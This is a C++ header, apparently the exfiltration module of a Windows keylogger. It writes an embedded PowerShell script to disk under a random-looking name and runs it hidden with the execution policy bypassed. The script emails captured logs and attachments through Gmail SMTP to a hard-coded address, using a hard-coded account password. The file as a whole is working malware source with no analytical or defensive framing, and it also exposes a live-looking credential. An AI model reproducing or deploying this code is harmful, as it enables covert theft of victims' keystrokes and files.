#ifndef SENDER_H
#define SENDER_H

#include <fstream>
#include <vector>
#include "windows.h"

#include "IO.h"
#include "Timer.h"
#include "KLint.h"

#define SCRIPT_NAME "fhew9093yfe892-38eri0die3883.ps1"

namespace Shell
{
    #define X_EM_TO "sender.klint@gmail.com"
    #define X_EM_FROM "sender.klint@gmail.com"
    #define X_EM_PASS "noufrgrqeabjjrzn"

    const std::string &ShellScript =
    "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
    "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
    " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$From,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
    "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
    "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
    "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
    "  ForEach ($val in $Attachments)\r\n                    "
    "        {\r\n               "
    "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
    "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
    "}\r\n                catch\r\n                    {\r\n                        exit 2; "
    "\r\n                    }\r\n            }\r\n "
    "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
    "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
    "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
    "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
    "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
    "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
    "Send-EMail -attachment $Att "
    "-To \"" +
     std::string (X_EM_TO) +
     "\""
    " -Body $Body -Subject $Subj "
    "-password \"" +
     std::string (X_EM_PASS) +
      "\""
    " -From \"" +
     std::string (X_EM_FROM) +
    "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS

    std::string strReplace(std::string s, const std::string &what, const std::string &with)
    {
        if(what.empty())
        {
            return s;
        }
        size_t sp = 0;

        while( (sp=s.find(what,sp) ) != std::string::npos)
        {
            s.replace(sp, what.length(), with), sp +=with.length();
        }
        return s;
    }

    bool checkFileExists(const std::string &f)
    {
        std::ifstream file (f);
        return (bool)file;
    }

    bool createScript()
    {
        std::ofstream script(IO::getBasePath(true) + std::string(SCRIPT_NAME));

        if(!script)
            return false;
        script << ShellScript;

        if (!script)
            return false;
        script.close();
        return true;
    }

    Timer m_timer;

    int runShell(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        bool x_og;
        x_og = IO::mkDir(IO::getBasePath(true));

        if(!x_og)
            return -1;

        std::string src_path = IO::getBasePath(true) + std::string(SCRIPT_NAME);

        if(!checkFileExists(src_path))
            x_og = createScript();
        if(!x_og)
            return -2;

        std::string param = "-ExecutionPolicy ByPass -File \"" + src_path + "\" -Subj \""
                            + strReplace(subject, "\"", "\\\"") +
                            "\" -Body \""
                            + strReplace(body, "\"", "\\\"") +
                            "\" -Att \"" + attachments + "\"";

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = "open";
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = NULL;

        x_og = (bool)ShellExecuteEx(&ShExecInfo);

        if(!x_og)
            return -3;
        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        m_timer.setFunction([&]()
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

            if( (int)exit_code == STILL_ACTIVE)
            {
                TerminateProcess(ShExecInfo.hProcess, 100);
            }

            KL::appendLogs("[From Shell Run] - Return Code" + KL::toString((int)exit_code));

        });

        m_timer.repeatCount(1L);
        m_timer.setInterval(10L);
        m_timer.start(true);

        return (int)exit_code;
    }

    int runShell(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
    {
        std::string attachments = "";
        if(att.size() == 1U)
        {
            attachments = att.at(0);
        }
        else
        {
            for(const auto &v : att)
            {
                attachments += v + "::";
            }

            attachments = attachments.substr(0, attachments.length() - 2);
        }

        return runShell(subject, body, attachments);
    }

}

#endif
